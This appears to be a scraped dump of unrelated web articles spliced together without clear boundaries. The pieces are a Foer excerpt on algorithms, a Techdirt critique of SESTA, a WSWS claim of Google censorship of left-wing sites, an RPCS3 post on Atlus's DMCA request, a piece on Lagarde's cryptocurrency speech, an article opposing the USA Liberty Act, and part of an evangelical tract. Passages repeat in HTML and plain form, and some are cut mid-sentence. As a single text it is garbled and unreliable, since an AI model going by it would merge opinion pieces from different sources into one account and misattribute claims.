of their “likes” alone. It’s Zuckerberg’s fantasy that this data might be analysed to uncover the mother of all revelations, “a fundamental mathematical law underlying human social relationships that governs the balance of who and what we all care about”. That is, of course, a goal in the distance. In the meantime, Facebook will keep probing – constantly testing to see what we crave and what we ignore, a never-ending campaign to improve Facebook’s capacity to give us the things that we want and things we don’t even know we want. Whether the information is true or concocted, authoritative reporting or conspiratorial opinion, doesn’t really seem to matter much to Facebook. The crowd gets what it wants and deserves.The automation of thinking: we’re in the earliest days of this revolution, of course. But we can see where it’s heading. Algorithms have retired many of the bureaucratic, clerical duties once performed by humans – and they will soon begin to replace more creative tasks. At Netflix, algorithms suggest the genres of movies to commission. Some news wires use algorithms to write stories about crime, baseball games and earthquakes – the most rote journalistic tasks. Algorithms have produced fine art and composed symphonic music, or at least approximations of them.It’s a terrifying trajectory, especially for those of us in these lines of work. If algorithms can replicate the process of creativity, then there’s little reason to nurture human creativity. Why bother with the tortuous, inefficient process of writing or painting if a computer can produce something seemingly as good and in a painless flash? Why nurture the overinflated market for high culture when it could be so abundant and cheap? No human endeavour has resisted automation, so why should creative endeavours be any different?The engineering mindset has little patience for the fetishisation of words and images, for the mystique of art, for moral complexity or emotional expression. It views humans as data, components of systems, abstractions. That’s why Facebook has so few qualms about performing rampant experiments on its users. The whole effort is to make human beings predictable – to anticipate their behaviour, which makes them easier to manipulate. With this sort of cold-blooded thinking, so divorced from the contingency and mystery of human life, it’s easy to see how long-standing values begin to seem like an annoyance – why a concept such as privacy would carry so little weight in the engineer’s calculus, why the inefficiencies of publishing and journalism seem so imminently disruptable.Facebook would never put it this way, but algorithms are meant to erode free will, to relieve humans of the burden of choosing, to nudge them in the right direction. Algorithms fuel a sense of omnipotence, the condescending belief that our behaviour can be altered, without our even being aware of the hand guiding us, in a superior direction. That’s always been a danger of the engineering mindset, as it moves beyond its roots in building inanimate stuff and begins to design a more perfect social world. We are the screws and rivets in the grand design.Extracted from World Without Mind: The Existential Threat of Big Tech by Franklin Foer, out now in the US and published in the UK by Jonathan Cape on 28 September, priced £18.99.

Over and over again, we've seen defenders of<br/> the bill -- almost none of whom have much, if any, experience in <br/>managing services on the internet -- insist that the bill is &#34;narrowly <br/>targeted&#34; and wouldn't create any problems at all for smaller internet <br/>services. However, with the way the bill is worded, that seems unlikely.<br/> As stated in the last post, by opening up sites to facing both lawsuits<br/> from state Attorneys General and civil lawsuits, SESTA puts almost any <br/>site that offers services to the public at risk. The problematic <br/>language in the bill is that this is the &#34;standard&#34; for liability:<br/></p><br/><blockquote><em><br/></em><p><br/>&#34;The term 'participation in a venture' means knowing conduct by an <br/>individual or entity, by any means, that assists, supports, or <br/>facilitates a violation....&#34;<br/></p><br/></blockquote><br/><p><br/>And that could apply to just about anyone offering services online.

But there are multiple reports of how some people have <a href=\"http://www.bbc.com/news/magazine-39528479\">used Airbnb</a> for <a href=\"http://nypost.com/2014/04/14/hookers-using-airbnb-to-use-apartments-for-sex-sessions/\" target=\"_blank\">prostitution</a>.<br/> I'm quite sure that Airbnb doesn't want its users to use the platform <br/>in this way, but under SESTA, it will face criminal and civil penalties <br/>-- and it has no way to prevent it. Prosecutors or civil litigants can <br/>easily point to these articles, and note that this demonstrates <br/>&#34;knowledge&#34; that Airbnb is &#34;facilitating&#34; sex trafficking, and, voila, <br/>no CDA 230 protections.<br/></li><br/><li><b>Square</b>: The popular payments processor that has made it easy <br/>for small businesses to accept credit cards... can also be used for <br/>prostitution/sex trafficking. Square can't specifically watch over what <br/>each of its customers is selling, but clearly, it wouldn't be difficult <br/>for prosecutors and/or civil litigants to argue that Square is knowingly<br/> facilitating trafficking by allowing traffickers to accept payments.<br/></li><br/><li><b>Facebook</b>: Obviously, tons of sex traffickers use Facebook to advertise their wares.

			"body_p": "Earlier today, I wrote up a list of the many problems with SESTA (Stop Enabling Sex Traffickers Act) and how it will be abused. Over and over again, we've seen defenders of the bill -- almost none of whom have much, if any, experience in managing services on the internet -- insist that the bill is &#34;narrowly targeted&#34; and wouldn't create any problems at all for smaller internet services. However, with the way the bill is worded, that seems unlikely. As stated in the last post, by opening up sites to facing both lawsuits from state Attorneys General and civil lawsuits, SESTA puts almost any site that offers services to the public at risk. The problematic language in the bill is that this is the &#34;standard&#34; for liability:&#34;The term 'participation in a venture' means knowing conduct by an individual or entity, by any means, that assists, supports, or facilitates a violation....&#34;And that could apply to just about anyone offering services online. So, let's dig into a few examples of companies and services potentially facing liability thanks to this nuclear bomb-sized hole in CDA 230.Airbnb: I did a whole post on this earlier. But there are multiple reports of how some people have used Airbnb for prostitution. I'm quite sure that Airbnb doesn't want its users to use the platform in this way, but under SESTA, it will face criminal and civil penalties -- and it has no way to prevent it. Prosecutors or civil litigants can easily point to these articles, and note that this demonstrates &#34;knowledge&#34; that Airbnb is &#34;facilitating&#34; sex trafficking, and, voila, no CDA 230 protections.Square: The popular payments processor that has made it easy for small businesses to accept credit cards... can also be used for prostitution/sex trafficking. Square can't specifically watch over what each of its customers is selling, but clearly, it wouldn't be difficult for prosecutors and/or civil litigants to argue that Square is knowingly facilitating trafficking by allowing traffickers to accept payments.Facebook: Obviously, tons of sex traffickers use Facebook to advertise their wares. There have been news stories about this. So clearly Facebook has &#34;knowledge.&#34; If it can't magically eradicate it, it may also now have to deal with criminal and civil lawsuits lobbed its way.Snapchat: Last year there was a story of a teenager lured into a sex trafficking ring via Snapchat. So, clearly, lawyers might argue that Snapchat has &#34;facilitated&#34; sex trafficking.Wordpress/Automattic: Automattic hosts a significant portion of the entire internet with its powerful Wordpress.com platform. It's pretty damn likely that at least some sex traffickers use Wordpress to set up sites promoting what they're offering. Thus, it's &#34;facilitating&#34; sex trafficking.Wikipedia: You wouldn't think of Wikipedia as being a hub for sex trafficking, but the site gets hit with spam all the time, and people trying to promote stuff via its webpages -- and even when spam is edited out, it remains viewable in the history tabs. So, if a few links to trafficking advertisements show up, even if edited out, Wikipedia could face liability for facilitating such ads.Google Docs: Did sex traffickers use Google docs to create fliers or manage a spreadsheet? Is that &#34;facilitating&#34; sex trafficking? Well, we might not know until after a court goes through a long and involved process to figure it out.Cloudflare: Tons of websites use Cloudflare as a CDN to provide better uptime. What if one of them involves advertisements for sex trafficking. Is Cloudflare liable? After all, its CDN and anti-DDoS technology helped &#34;facilitate&#34; the service...Rackspace: Popular hosting company has millions of websites. If one of them hosts advertising for trafficking, it can be liable for facilitating sex trafficking.Amazon: Through its web services arm, Amazon hosts a large portion of the internet. Can you say for certain that Amazon S3 isn't used somewhere by some sex trafficking parties?YouTube: These days, almost anything can be found in videos, and while YouTube has a system to &#34;notify&#34; the company of abuse, that may be used against the company, claiming &#34;knowledge.&#34; After all, in a case in Italy where Google execs were found criminally liable, the fact that some users clicked the &#34;notify&#34; button was used as evidence against the execs.Namecheap: Has Namecheap ever registered a domain that was then used by sex traffickers? Well, then it can be argued that it facilitated sex trafficking, and is not protected by CDA 230.Indeed: Basically any &#34;job board&#34; is at risk. There are stories of sex traffickers seeking victims via promises of summer jobs -- and while these stories are highly dubious at best, similar accusations against online job boards under SESTA would be easy to make.Reddit: As an open forum, certainly sex trafficking gets discussed in some corners of the site. Is it possible that some have used it to help facilitate trafficking? Absolutely.Any site that has comments: And that includes sites like Techdirt. Want to get a site in trouble? Why not spam its comments with links to sex trafficking ads? Voila, you've now put those sites at risk of criminal and civil liability...The point of this is that this list can go on and on and on. Almost any internet service can be used in some way to &#34;facilitate&#34; sex trafficking. And rather than recognizing that the problem is those engaging in sex trafficking, SESTA now lets everyone go after the tools they use. But nearly all those tools are mostly used for perfectly legitimate, non-illegal activity. Yet, under SESTA, all face massive liability and the potential for criminal charges.Clearnet: https://www.techdirt.com/articles/20170919/07115338236/is-there-single-online-service-not-put-risk-sesta.shtml",

Google is off the rails!-------Google intensifies censorship of left-wing websitesBy Andre Damon 19 September 2017  Google has intensified its censorship of left-wing, progressive and anti-war websites, cutting the search traffic of 13 leading news outlets by 55 percent since April.On August 2, the World Socialist Web Site reported that changes to Google’s search algorithm had led the search traffic of these sites to drop by 45 percent, according to figures by the search analysis service SEMRush.In the ensuing six weeks, the search traffic of every one of these sites, without exception, has plunged further, leading the total search traffic for the sites to fall by an additional nine percentage points.The World Socialist Web Site, whose search traffic had fallen by 67 percent between April and July, has now experienced a total drop in search traffic of 74 percent.By other measures, the WSWS’s performance in search results has been impacted even more substantially. On September 16, the latest date available, articles from the WSWS were shown in search results 68,000 times, down from over 450,000 in April. This constitutes a decline of some 85 percent.As a result of Google’s censorship, the WSWS’s global page rank has fallen from 31,000 to 41,000, according to Amazon’s Alexa traffic ranking software.Other sites affected include:Alternet, one of the top 3,000 sites in the US, has seen its Google search traffic fall by 71 percent between April and September, up from 63 percent in the period through July.Democracy Now, one of the top 5,000 sites in the US, had its search traffic fall 50 percent between April and September, up from 36 percent in the period through July.Common Dreams, ranked in the top 8,000 US sites, had its Google search traffic fall by 50 percent between April and September, up from 37 percent in the period through July.Global Research, one of the top 14,000 sites in the US, had its traffic fall slightly from its massive 62 percent decline between April and July.Truth-out.org, ranked in the top 12,000 sites in the US, had its search traffic fall by 49 percent, up from 25 percent in the period through July.The information uncovered by the WSWS has been prominently reported on a number of alternative news websites, including Consortium News, Global Research, Counterpunch, Truthdig, Russia Today, Truepublica and others.In an article on Truthdig, the Pulitzer Prize-winning journalist Chris Hedges pointed to the censorship of the WSWS and other left-wing websites: “The ruling elites, who grasp that the reigning ideology of global corporate capitalism and imperial expansion no longer has moral or intellectual credibility, have mounted a campaign to shut down the platforms given to their critics…“This is a war of ideas. The corporate state cannot compete honestly in this contest. It will do what all despotic regimes do—govern through wholesale surveillance, lies, blacklists, false accusations of treason, heavy-handed censorship and, eventually, violence.”Despite the broad support for the WSWS’s calls for an end to Google’s Internet censorship, the company has refused to reply either to the WSWS’s petition opposing its censorship or repeated attempts to contact it for comment.While Google’s censorship has substantially reduced traffic to the WSWS, its effect has been partially counteracted by readers sharing articles through email and social media. One widely shared article published on September 9, titled “Why aren’t trains evacuating people from the path of Hurricane Irma?”, has been viewed over 90,000 times.While only about 300 people reached the article through Google, tens of thousands accessed it through links from other websites and social media platforms.In April, Google’s vice president of engineering, Ben Gomes, announced in a blog post that the search giant would be implementing changes to its search algorithm to “surface more authoritative content.” Google’s guidelines for human search evaluators, issued around the same time, stressed that “authoritative” content should appear ahead of “alternative viewpoints.”On August 25, World Socialist Web Site Editorial Board Chairman David North issued an open letter to Google demanding that it stop censoring the Internet and end its political blacklisting of the WSWS.An online petition calling for Google to end its censorship has received over 3,800 signatures from dozens of countries.Google, however, has not replied to North’s letter.Recent weeks have seen a drastic escalation in calls for Internet censorship. The campaign to censor the Internet—usually justified in the name of “fighting terrorism” and blacking out “fake news”—has assumed international dimensions and is promoted at the highest levels of government. On ABC’s This Week program on Sunday, the first three people interviewed, including British Prime Minister Theresa May, US National Security Adviser Gen. H.R. McMaster, and Adam Schiff, the ranking Democrat on the House Intelligence Committee, called for stricter control of the Internet.President Donald Trump responded to last week’s terror attack in London with a tweet declaring that “we must cut off” the Internet.In her newly released book, What Happened?, Hillary Clinton again attributes her defeat to “fake news.” She writes approvingly that “Companies such as Facebook, Twitter, and Google have already begun taking steps—adjusting algorithms, deactivating bot networks, and partnering with fact-checkers”—to fight the “torrent of misinformation” supposedly responsible for the outcome of the election.Google’s actions against the World Socialist Web Site and other left and progressive sites are making clear the real targets of Internet censorship: news outlets and political organizations opposing war, social inequality and the domination of society by the financial oligarchy.Clearnet: https://www.wsws.org/en/articles/2017/09/19/goog-s19.html",

The morning <br/>of September 23rd we woke up to a calling card. Here is exactly what <br/>happened:</p><br/><br/><p>Atlus U.S.A. filed a DMCA takedown request directly to Patreon <br/>requesting the removal of Nekotekina &amp; kd-11’s Patreon page for <br/>RPCS3 development. The reason given is as follows:</p><br/><br/><blockquote><br/><p>“The PS3 emulator itself is not infringing on our copyrights and <br/>trademarks; however, no version of the P5 game should be playable on <br/>this platform; and [the RPCS3] developers are infringing on our IP by <br/>making such games playable”</p><br/></blockquote><br/><br/><p>Patreon responded to this request by stating they do not believe that<br/> removing the Patreon page entirely to be reasonable, given that the <br/>page itself does not specifically infringe on Atlus’s IP, and that they <br/>believe the emulator itself falls under fair use. After Patreon declined<br/> to remove the Patreon page, Atlus retorted by alleging:</p><br/><br/><blockquote><br/><p>“We kindly ask that you remove both for this reason – to make Persona<br/> 5 work on the emulator, the user has to circumvent our DRM protections.<br/> The following blog post provides specific instructions for “dumping the<br/> disc or PSN download” and discusses how Patreon finding [sic] <br/>contributed to this breakthrough: [link since removed].”</p><br/></blockquote><br/><br/><p>Here’s a quote of our “specific [dumping] instructions” straight from<br/> our Quickstart guide.

We believe that this is the most efficient and <br/>safest way to migrate your disc-based games and digital games from your <br/>console to your PC without the hassle of repairing bad game dumps found <br/>on the internet or possible legal repercussions.

Since a DMCA takedown would only target our Patreon (US <br/>based) and since our website is based outside the US, such action <br/>against our Patreon page would only end up temporarily cutting our main <br/>developers’ salaries and ultimately leaving the website untouched (note <br/>that Atlus requested the immediate removal of the Patreon page and not <br/>any content from the rpcs3.net website itself). </p><br/><br/><p><strong>Actions taken and comments</strong></p><br/><br/><p>In discussion with the very helpful people over at Patreon we have <br/>decided to proceed with caution.

Their primary <br/>reason given being: “no version of the P5 game should be playable on <br/>this platform [PC]” is quite peculiar indeed. Why Atlus would choose <br/>this time to target this project will probably never be known.

It could<br/> displace central banks, conventional banking, and challenge the <br/>monopoly of national monies.  </p><br/><p><span><a href=\"http://www.imf.org/external/np/omd/bios/cl.htm\">Christine Lagarde</a>–a Paris native who has held her position at the IMF since 2011–says the <br/>only substantial problems with existing cryptocurrency are fixable over <br/>time. </span></p><br/><p><span>In the long run, the technology itself can replace national <br/>monies, conventional financial intermediation, and even &#34;puts a question<br/> mark on the fractional banking model we know today.&#34;</span></p><br/><p><span>In a lecture that chastised her colleagues for failing to <br/>embrace the future, she warned that &#34;Not so long ago, some experts <br/>argued that personal computers would never be adopted, and that tablets <br/>would only be used as expensive coffee trays. So I think it may not be <br/>wise to dismiss virtual currencies.&#34;</span></p><br/><p><span>Here are the relevant parts of her paper:</span></p><br/><blockquote><br/><p>Let us start with<span> </span><strong>virtual currencies</strong>. To be clear, this is not about digital payments in<span> </span><em>existing</em><span> </span>currencies—through Paypal and other “e-money” providers such as Alipay in China, or M-Pesa in Kenya.</p><br/><p>Virtual currencies are in a different category, because they provide <br/>their own unit of account and payment systems. These systems allow for <br/>peer-to-peer transactions<span> </span><em>without</em><span> </span>central clearinghouses,<span> </span><em>without</em><span> </span>central banks.</p><br/><p>For now, virtual currencies such as Bitcoin pose little or no challenge to the existing order of<span> </span><em>fiat</em><span> </span>currencies<br/> and central banks. Why? Because they are too volatile, too risky, too <br/>energy intensive, and because the underlying technologies are not yet <br/>scalable. Many are too opaque for regulators; and some have been hacked.</p><br/><p>But many of these are<span> </span><em>technological</em><span> </span>challenges<br/> that could be addressed over time. Not so long ago, some experts argued<br/> that personal computers would never be adopted, and that tablets would <br/>only be used as expensive coffee trays. So I think it may not be wise to<br/> dismiss virtual currencies.</p><br/><p><strong><em>Better value for money?</em></strong></p><br/><p>For instance, think of countries with weak institutions and unstable <br/>national currencies. Instead of adopting the currency of another <br/>country—such as the U.S. dollar—some of these economies might see a <br/>growing use of virtual currencies. Call it dollarization 2.0.</p><br/><p>IMF experience shows that there is a tipping point beyond which <br/>coordination around a new currency is exponential. In the Seychelles, <br/>for example, dollarization jumped from<span> </span><strong>20 percent</strong><span> </span>in 2006 to<span> </span><strong>60 percent</strong><span> </span>in 2008.</p><br/><p>And yet, why might citizens hold virtual currencies rather than physical dollars, euros, or sterling? Because it may one day be<span> </span><em>easier<span> </span></em>and<span> </span><em>safer</em><span> </span>than obtaining paper bills, especially in remote regions. And because virtual currencies could actually become<span> </span><em>more stable</em>.</p><br/><p>For instance, they could be issued one-for-one for dollars, or a <br/>stable basket of currencies.

			"body_p": "In a remarkably frank talk at a Bank of England conference, the Managing Director of the International Monetary Fund has speculated that Bitcoin and cryptocurrency have as much of a future as the Internet itself. It could displace central banks, conventional banking, and challenge the monopoly of national monies.  Christine Lagarde–a Paris native who has held her position at the IMF since 2011–says the only substantial problems with existing cryptocurrency are fixable over time. In the long run, the technology itself can replace national monies, conventional financial intermediation, and even &#34;puts a question mark on the fractional banking model we know today.&#34;In a lecture that chastised her colleagues for failing to embrace the future, she warned that &#34;Not so long ago, some experts argued that personal computers would never be adopted, and that tablets would only be used as expensive coffee trays. So I think it may not be wise to dismiss virtual currencies.&#34;Here are the relevant parts of her paper:Let us start with virtual currencies. To be clear, this is not about digital payments in existing currencies—through Paypal and other “e-money” providers such as Alipay in China, or M-Pesa in Kenya.Virtual currencies are in a different category, because they provide their own unit of account and payment systems. These systems allow for peer-to-peer transactions without central clearinghouses, without central banks.For now, virtual currencies such as Bitcoin pose little or no challenge to the existing order of fiat currencies and central banks. Why? Because they are too volatile, too risky, too energy intensive, and because the underlying technologies are not yet scalable. Many are too opaque for regulators; and some have been hacked.But many of these are technological challenges that could be addressed over time. Not so long ago, some experts argued that personal computers would never be adopted, and that tablets would only be used as expensive coffee trays. So I think it may not be wise to dismiss virtual currencies.Better value for money?For instance, think of countries with weak institutions and unstable national currencies. Instead of adopting the currency of another country—such as the U.S. dollar—some of these economies might see a growing use of virtual currencies. Call it dollarization 2.0.IMF experience shows that there is a tipping point beyond which coordination around a new currency is exponential. In the Seychelles, for example, dollarization jumped from 20 percent in 2006 to 60 percent in 2008.And yet, why might citizens hold virtual currencies rather than physical dollars, euros, or sterling? Because it may one day be easier and safer than obtaining paper bills, especially in remote regions. And because virtual currencies could actually become more stable.For instance, they could be issued one-for-one for dollars, or a stable basket of currencies. Issuance could be fully transparent, governed by a credible, pre-defined rule, an algorithm that can be monitored…or even a “smart rule” that might reflect changing macroeconomic circumstances.So in many ways, virtual currencies might just give existing currencies and monetary policy a run for their money. The best response by central bankers is to continue running effective monetary policy, while being open to fresh ideas and new demands, as economies evolve.Better payment services?For example, consider the growing demand for new payment services in countries where the shared, decentralized service economy is taking off.This is an economy rooted in peer-to-peer transactions, in frequent, small-value payments, often across borders.Four dollars for gardening tips from a lady in New Zealand, three euros for an expert translation of a Japanese poem, and 80 pence for a virtual rendering of historic Fleet Street: these payments can be made with credit cards and other forms of e-money. But the charges are relatively high for small-value transactions, especially across borders.Instead, citizens may one day prefer virtual currencies, since they potentially offer the same cost and convenience as cash—no settlement risks, no clearing delays, no central registration, no intermediary to check accounts and identities. If privately issued virtual currencies remain risky and unstable, citizens may even call on central banks to provide digital forms of legal tender.So, when the new service economy comes knocking on the Bank of England’s door, will you welcome it inside? Offer it tea—and financial liquidity?New models of financial intermediationThis brings us to the second leg of our pod journey—new models of financial intermediation.One possibility is the break-up, or unbundling, of banking services. In the future, we might keep minimal balances for payment services on electronic wallets.The remaining balances may be kept in mutual funds, or invested in peer-to-peer lending platforms with an edge in big data and artificial intelligence for automatic credit scoring.This is a world of six-month product development cycles and constant updates, primarily of software, with a huge premium on simple user-interfaces and trusted security. A world where data is king. A world of many new players without imposing branch offices.Some would argue that this puts a question mark on the fractional banking model we know today, if there are fewer bank deposits and money flows into the economy through new channels.How would monetary policy be set in this context?Today’s central banks typically affect asset prices through primary dealers, or big banks, to which they provide liquidity at fixed prices—so-called open-market operations. But if these banks were to become less relevant in the new financial world, and demand for central bank balances were to diminish, could monetary policy transmission remain as effective?Clearnet: https://fee.org/articles/imf-head-predicts-the-end-of-banking-and-the-triumph-of-cryptocurrency/",

			"body": "<p>Every time Section 702 of the Foreign Intelligence Surveillance Act (FISA) is set to expire, the surveillance hawks prop it back up, give it a fresh coat of paint, and promise to (<em>really, this time</em>) protect the privacy of American citizens. And every time, the “reforms” succeed in refueling the surveillance machine so that it can continue to bulldoze citizens’ rights in the name of national security. With the surveillance programs authorized under Section 702 set to expire on December 31, 2017, the surveillance hawks are at it again.</p><p>On Thursday, House Judiciary Committee Chairman Bob Goodlatte (R-Va.) and Ranking Member John Conyers, Jr. (D-Mich.), along with Reps. Jim Sensenbrenner (R-Wis.) and Sheila Jackson Lee (D-Texas), held a press conference to announce the introduction of the USA Liberty Act (a misnomer not to be confused with the equally <a href=\"https://www.thenewamerican.com/usnews/constitution/item/22073-usa-freedom-act-new-law-same\">misnamed USA Freedom Act</a>, though — given that they both promise “liberty” and “freedom” while empowering the surveillance state to strip Americans of those very things — your confusion would be easily forgiven).</p><div class=\"custom\"><a href=\"http://adserve.jbs.org/www/delivery/ck.php?n=ae06b907&amp;cb=INSERT_RANDOM_NUMBER_HERE\" target=\"_blank\"><img src=\"http://adserve.jbs.org/www/delivery/avw.php?zoneid=334&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=ae06b907\" alt=\"\" border=\"0\"/></a></div><p>Section 702 is deservedly one of the most controversial portions of FISA, since it authorizes the collection of massive amounts of data from a wide variety of sources with so little real oversight and almost no real restrictions. The Center for Democracy &amp; Technology (CDT) aptly describes Section 702 as:</p><p>Section 702 of the Foreign Intelligence Surveillance Act (FISA) is a statute that authorizes the collection, use, and dissemination of electronic communications content stored by U.S. internet service providers (such as Google, Facebook, and Microsoft) or traveling across the internet’s “backbone” (with the compelled assistance of U.S. telecom providers such as AT&amp;T and Verizon). Section 702 sunsets on December 31, 2017.</p><p>CDT also acknowledges that the “restrictions” that ostensibly keep Section 702 in line are inadequate to the task, stating:</p><p>Unlike “traditional” FISA surveillance, Section 702 does not require that the surveillance target be a suspected terrorist, spy, or other agent of a foreign power. Section 702 only requires that the targets be non-U.S. persons located abroad, and that a “significant purpose” of the surveillance be to obtain “foreign intelligence information” (the primary purpose of the surveillance can be something else entirely).</p><p>That is an accurate (if incomplete) assessment, since, while many claim that the powers granted by Section 702 are abused, the reality is that they are designed for abuse. The surveillance hawks love Section 702 because it allows that abuse.</p><p>The Electronic Frontier Foundation (EFF) — an organization dedicated to defending digital liberty in an age of nearly ubiquitous surveillance — describes the surveillance that takes place under the authority of Section 702 as “warrantless” and “suspiciousness.” EFF’s description goes on to say:</p><p>The U.S. government uses Section 702 to justify the collection of the communications of innocent people overseas and in the United States by tapping into the cables that carry domestic and international Internet communications through what's known as Upstream surveillance. The government also forces major U.S. tech companies to turn over private communications stored on their servers through a program often referred to as PRISM. While the programs under Section 702 are theoretically aimed at foreigners outside the United States, they constantly collect Americans’ communications with no meaningful oversight from the courts.</p><p>The type of surveillance conducted under Section 702 was first brought to the attention of Americans as part of the Snowden revelations. American citizens, outraged by what they learned, demanded reform of the surveillance state. The surveillance hawks promised reform and in June 2015 delivered the USA Freedom Act — equal parts smoke and mirrors. As this writer <a href=\"https://www.thenewamerican.com/usnews/constitution/item/22073-usa-freedom-act-new-law-same\">reported</a> in December 2015, when that act took effect:</p><p>The USA FREEDOM Act, like the USA PATRIOT Act of 2001, is a misnomer. The name is a not-very-subtle manipulation, designed to hide from the American people the real nature of the law. The architects of the USA PATRIOT Act used the word &#34;patriot&#34; to persuade Americans that the &#34;patriotic&#34; way to confront the specter of terrorism was to trade liberty for security. It took the one but never delivered the other. Likewise, in the USA FREEDOM Act, the use of the word &#34;freedom&#34; is designed to convince Americans that their freedom is being returned to them by &#34;reforming&#34; the surveillance state. In fact, <a href=\"https://www.thenewamerican.com/usnews/constitution/item/22004-nsa-documents-e-mail-surveillance-continues-with-less-oversight\">no such reform is taking place.</a></p><p>The USA Freedom Act was not a reform; it was merely the next piece of sleight-of-hand in a shell game being played by the surveillance state with American citizens as the victims. Predictable and systemic abuses of Section 702 powers are <a href=\"https://www.newamerica.org/oti/blog/history-fisa-section-702-compliance-violations/\">well documented </a>and — while they appear to have reached a peak in 2015/2016 — have not halted, even with the advent of the USA Freedom Act.</p><p>The problem is that warrantless surveillance is — regardless of the reasons given — a violation of the Fourth Amendment guarantee against unreasonable searches. As Dr. Ron Paul <a href=\"https://www.thenewamerican.com/reviews/opinion/item/20809-usa-freedom-act-just-another-word-for-lost-liberty\">explained</a>, “There is no ‘terrorist’ exception in the Fourth Amendment. Saying a good end (capturing terrorists) justifies a bad means (mass surveillance) gives the government a blank check to violate our liberties.”</p><p>After passing the cleverly misnamed USA Freedom Act off on the American people in a successful bid to keep the surveillance machine running at full steam, the surveillance hawks in both the intelligence community and Congress knew that they would need another piece of crafty legislation to keep the game going once the sunset provision for Section 702 came up again. That crafty piece of legislation is the USA Liberty Act. The name — and the content — of this bill are an insult to the intelligence of the American people.</p><p>As the Project On Government Oversight (POGO) <a href=\"http://www.pogo.org/about/press-room/releases/2017/newly-introduced-surveillance-act-fails-to-fully-protect-american-citizens-fisa.html\" target=\"_blank\">explains</a>:</p><p>The Project On Government Oversight has pushed for reforms to be made to FISA that adequately protect American citizens’ civil liberties while keeping the country safe from harm. This piece of legislation fails to accomplish either of these goals and we are specifically concerned with three areas of the newly unveiled legislation.</p><p>The three areas of concern for POGO are:</p><p>1. Whistleblower Protections for Intelligence Community Contractors — about which POGO says:</p><p>As written, the bill lacks teeth to enforce the provisions against retaliation for blowing the whistle, and we call on the sponsors to add stronger enforcement mechanisms to this bill for both contractors and federal employees through the committee process before sending it to the Floor for a vote. Until these employees feel comfortable blowing the whistle because they know they will be protected from retaliation, Congress is creating an incentive to go outside of proper reporting channels.</p><p>2. Exemptions for Privacy and Civil Liberties Oversight Board (PCLOB) — about which POGO says:</p><p>This draft bill purports to exempt the essential oversight board from the Government in the Sunshine Act, an exemption that would allow the members of the board to meet in secret to discuss issues under its purview.</p><p>We are sympathetic to the argument that open-meeting laws may complicate the ability of the board to complete its mission, but a full exemption from transparency laws is not the responsible way to address this problem. We urge the committee to work with civil society to find a common ground that promotes adequate transparency without hindering the work of this oversight board.</p><p>3. Surveillance Program Still Puts Americans’ Civil Liberties at Risk — about which POGO says:</p><p>While this draft bill attempts to provide a fix for the backdoor search loophole, it does not go far enough to ensure Americans’ civil liberties are protected. By allowing an exception for foreign intelligence searches with an overly broad definition of such searches, Americans may still find their Fourth Amendment rights violated.</p><p>We applaud the inclusion of reporting to Congress of an estimate of the number of Americans’ communications that have been subject to “incidental” collection under section 702, but we encourage the committee to make this report available to the public. We also encourage the committee to consider further provisions to increase public oversight over these programs.</p><p>CDT, EFF, and POGO are far from alone in their concerns about the continuance of the Section 702 game under the so-called USA Liberty Act. Tom’s Hardware — a website that devotes its attention to tech news about new gadgets and computer parts — weighed in on the topic with an article titled “<a href=\"http://www.tomshardware.com/news/usa-freedom-act-spying-americans,35623.html\" target=\"_blank\">USA Liberty Act: New ‘Foreign’ Intelligence Law Will Legalize Spying On Americans</a>.” The article points out that, “although the bill does aim to curtail some <a href=\"https://s3.amazonaws.com/demandprogress/reports/FISA_Violations.pdf\" target=\"_blank\">illegal NSA activities</a> and <a href=\"https://www.newamerica.org/oti/blog/history-fisa-section-702-compliance-violations/\" target=\"_blank\">abuses</a> that shouldn’t have happened in the first place, it also codifies into law the bulk collection of Americans' data. It also codifies the NSA’s ability to share data with other domestic agencies.” The article goes on to say:</p><p>President Obama also <a href=\"https://www.nytimes.com/2017/01/12/us/politics/nsa-gets-more-latitude-to-share-intercepted-communications.html\" target=\"_blank\">expanded some executive rules</a> last year that allowed the NSA to share raw intelligence data without a warrant with 16 other agencies. Because the shared data is raw, Americans’ data can be seen by agents from any of the 17 agencies, without any judicial approval. Such broad access may also put this data at risk from cyber attacks.</p><p>It’s not clear if the new USA Liberty Act, which does require a warrant when Americans’ communications content is accessed by the other 16 agencies, including the FBI, overrides those rules. The USA Liberty Act is also much more relaxed when it comes to metadata (phone or email records, etc.), requiring only a supervisor’s approval for access.</p><p>What is clear is that until last year, the so-called “incidental” data collected on Americans through foreign intelligence programs was supposed to be minimized and then automatically purged. However, President Obama’s expanded rules now allow 17 agencies to scour through that data before any minimization or purging happens.</p><p>Meanwhile, the USA Liberty Act seems to imply that data will be kept long enough that there will be enough time for domestic agencies to get warrants from judges or other type of approvals to obtain it. In other words, the supposed “incidental” collection is starting to seem less incidental and more purposeful.</p><p>And there is the rub; the NSA and other intelligence agencies have made it so normal for the exceptions to outnumber the rules that it is obvious to all but the most casual of observers that the rules are designed to give way to exceptions.</p><p>The American people deserve better. And all Americans who are concerned about preserving liberty should call and write their senators and representatives and tell them to vote “no” on the USA Liberty Act.</p><p><em><br/>Clearnet: https://www.thenewamerican.com/usnews/constitution/item/27078-usa-liberty-act-more-of-the-same-old-surveillance-state-games<br/></em></p>",

Law OneGod LOVES you and offers a wonderful PLAN for your life.(references contained on this Home Page are linked to the actual verses from the Bible, and should be read in context wherever possible.)God's Love&#34;For God so loved the world, that He gave His only begotten Son, that whoever believes in Him should not perish, but have everlasting life&#34; (John 3:16).God's Plan(Christ speaking) &#34;I came that they might have life, and might have it abundantly&#34; (that it might be full and meaningful) (John 10:10).Why is it that most people are not experiencing the abundant life?Because...Law TwoMan is SINFUL and SEPARATED from God. Thus he cannot know and experience God's love and plan for his life.Man is Sinful&#34;For all have sinned and fall short of the glory of God&#34; (Romans 3:23).Man was created to have fellowship with God; but, because of his stubborn self-will, he chose to go his own independent way, and fellowship with God was broken. This self-will, characterized by an attitude of active rebellion or passive indifference, is an evidence of what the Bible calls sin.Man is Separated&#34;For the wages of sin is death&#34; (spiritual separation from God) (Romans 6:23).                         \\                      /&#10;                          \\      HOLY GOD      /&#10;                           -------------------&#10;&#10;                                 ^         ^&#10;                            ^    |    ^    |&#10;                            |    |    |    |&#10;                           -------------------&#10;                          /     SINFUL MAN    \\&#10;                         /                     \\&#10;This diagram illustrates that God is holy and man is sinful. A great gulf separates the two. The arrows illustrate that man is continually trying to reach God and the abundant life through his own efforts, such as a good life, philosophy, or religion.The Third Law explains the only way to bridge this gulf...Law ThreeJesus Christ is God's ONLY provision for man's sin. Through Him you can know and experience God's love and plan for your life.He Died in 